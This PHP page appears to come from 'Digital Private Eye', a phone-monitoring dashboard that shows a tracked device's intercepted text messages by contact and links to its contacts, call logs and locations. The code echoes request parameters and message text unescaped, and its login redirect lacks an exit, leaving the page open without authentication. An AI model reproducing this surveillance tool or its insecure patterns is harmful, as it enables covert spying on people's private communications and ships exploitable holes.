<?php
session_start();
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = 'https://play.google.com/store/apps/details?id=com.ghostservice';
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";

if(!$_SESSION['user_id']) header("Location: sign-in.php");

$currentPage = $page = $_GET['page'];
if(!$currentPage) $currentPage = $page = 1;
include("logic/Devices.php");

$devicesModel = new Devices();
$deviceId = $_GET['device'];

$deviceInfo =  $devicesModel->getDeviceInfo($deviceId);
$deviceDescription = $deviceInfo['description'];


$textPeople =  $devicesModel->getDeviceTextsPeople($deviceId);
if($_GET['telephone']) $telephoneNumber = $_GET['telephone'];
else $telephoneNumber = $textPeople[0]['telephone'];

if($_GET['no_limit']) $limit= false;
else $limit=true;

$telephoneTexts = $devicesModel->getDeviceTelephoneTexts($deviceId, $telephoneNumber, $limit);

$basePath = $_SERVER['REQUEST_URL'];
$currentUrl = $basePath . "?device=". $deviceId;
$noLimitUrl = basename($_SERVER['REQUEST_URI'])."&no_limit=1";

?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Device Texts- <?=APPLICATION_NAME;?>- <?=$deviceDescription?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
    <!--[if IE 7]>
      <link rel="stylesheet" href="css/font-awesome-ie7.min.css">
    <![endif]-->
    <link rel="stylesheet" type="text/css" href="css/style.css" />

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Fav &amp; touch icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/sample/logo-144.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/sample/logo-114.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/sample/logo-72.png">
                    <link rel="apple-touch-icon-precomposed" href="img/sample/logo-57.png">
                                   <link rel="shortcut icon" href="img/sample/logo.png">
    
  </head>

  <body>


  <?php
  include "nav.php";
  ?>
    
    <div class="clear"></div>
    
    <div class="container-wrapper container-top">
      <div class="container container-top">
        <div class="row">
          <div class="col-md-12 center">
            <h1>Text Messages Of <?=$deviceDescription?></h1>
          </div>
        </div><!-- end row -->
      </div><!-- end container -->
    </div><!-- end container wrapper -->

  <?php $deviceId = $_GET['device'];?>
    <div class="container">
      <div class="row">
        <div class="col-md-3 bs-docs-nav-wrapper">
          <ul class="nav nav-pills nav-stacked bs-docs-nav" data-spy="affix" data-offset-top="250" data-offset-bottom="350">
              <li><a  class="list-group-item"href="javascript: location.reload();">Refresh Results&nbsp&nbsp<img src="img/refresh.png" style="width: 30px;"> </a></li>
              <li><a  class="list-group-item"target="_blank" href="device-texts-pdf.php?device=<?=$deviceId?>">Download Pdf&nbsp&nbsp<img src="img/download-button.png" style="width: 30px;"> </a></li>
          </ul>

            <ul class="nav nav-pills nav-stacked bs-docs-nav" data-spy="affix" data-offset-top="250" data-offset-bottom="350">
                <li><a  class="list-group-item" href="devices.php">Devices</a></li>
                <li><a  class="list-group-item" href="device-contacts.php?device=<?=$deviceId?>">Contacts</a></li>
                <li><a  class="list-group-item" href="device-call-logs.php?device=<?=$deviceId?>">Call Logs</a></li>
                <li><a  class="list-group-item" href="device-texts.php?device=<?=$deviceId?>">Text Messages</a></li>
                <li><a  class="list-group-item" href="device-locations.php?device=<?=$deviceId?>">Locations</a></li>
            </ul>
        </div>
        <div class="col-md-2" style="background-color: rgba(241,241,192,0); padding-right: 20%; border: 0px;">

            <div class="table-responsive" style="border: 0px;  ">
                <table   border="0" >
                    <tr>
                        <td style='padding-top:10px; word-wrap:break-word;'><strong></strong></td>
                    </tr>
                    <?php
                    if(!$textPeople) echo "<tr><td> No data to display</td></tr>";
                    else
                    {
                        foreach($textPeople as $person)
                        {
                            $personTelephone = $person['telephone'];
                            $lastTextDate = $person['text_date'];
                            $url = $currentUrl."&telephone=". $personTelephone;
                            if((strstr($telephoneNumber, $personTelephone))&& ($personTelephone!="0")) $buttonColor = "btn-purple";
                            else $buttonColor = "btn-white";
                            $name = $person['name'];
                            if(!$name) $name = $personTelephone; //If there is no associated contact name, display the telephone number.
                            echo "<tr>
                                    <td style='padding-right:10px;'>
                                        <a href=\"$url\" class=\"btn btn-md $buttonColor\" style=' font-size: 16px; width: 180px;'>$name</br>
                                            <span style='font-size: 10px;'>
                                                <script>
                                                    var localTime = new Date($lastTextDate);
                                                    document.write(localTime.toString().substring(0,25));
                                                </script>
                                            </span>
                                        </a>
                                    </td>
                                  </tr>";
                        }
                    }
                    ?>
                </table>
            </div>

        </div>
          <div class="col-md-6" style="border: 0px #cccccc solid; padding: 15px 15px 15px 15px;">

              <div class="table-responsive" style="width: 100%; border: 0px;">
                  <table  border="0">
                      <?php
                      if(!$telephoneTexts) echo "<tr><td> No data to display</td></tr>";
                      else
                      {
                      }
                      foreach($telephoneTexts as $text)
                      {
                          $textType = $text['messageType'];
                          if ($textType ==1) {
                              //$textAlign = "left";
                              $textColor = "#7C27CB";
                              $backgroundColor = "#ececec";
                          }
                          else if($textType ==2) {
                              //$textAlign = "right";
                              $textColor = "green";
                              $backgroundColor = "#fbfbfb";
                          }
                          $date = $text['date'];
                          $textAlign = "left";
                          $message = $text['message'];
                          $messageDifferential = 100 - strlen($message);
                          $message = $message . "</br>";
                          for($i=1;$i<=$messageDifferential;$i++)
                          {
                              $message = $message . "&nbsp";
                          }

                          if(($textType ==1)||($textType ==2))
                              echo "<tr>
                                    <td  >
                                        <div style='min-width: 300px; width: 80%; text-align: right; float: $textAlign; color: $textColor;
                                         border: 1px #ccc solid; border-radius: 5px; background-color: $backgroundColor;
                                         margin: 5px 0px 5px 0px ; padding: 20px 15px 20px 15px ;font-size: 14px;'>
                                            $message </br>
                                            <span style='font-size: 8px;'>
                                                <script>
                                                    var localTime = new Date($date);
                                                    document.write(localTime.toString().substring(0,25));
                                                </script>
                                            </span>
                                        </div>
                                    </td>
                                  </tr>";
                      }
                      if ($limit==true)echo " <tr><td style='text-align: center;'><div id='more'></br><a href=\"$noLimitUrl#more\" class=\"btn btn-md $buttonColor\">More .. . &nbsp; .</a></div></td></tr>";
                      else echo " <tr><td style='text-align: center; font-style: italic; font-size: 10px;'><div id='more'></br>End of messages</div></td></tr>";
                      ?>

                  </table>
              </div>
          </div>

          </div><!-- end row -->
      </div><!-- end row -->
    </div><!-- end container -->

    <div class="clear"></div>
    <?php
    include "footer.php";
    ?>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/zion.js"></script>
    <script type="text/javascript">
      
        $(document).ready(function(){
          $("body").scrollspy({target: ".bs-docs-nav-wrapper", offset:50});
        });
      
    </script>

  </body>
</html>
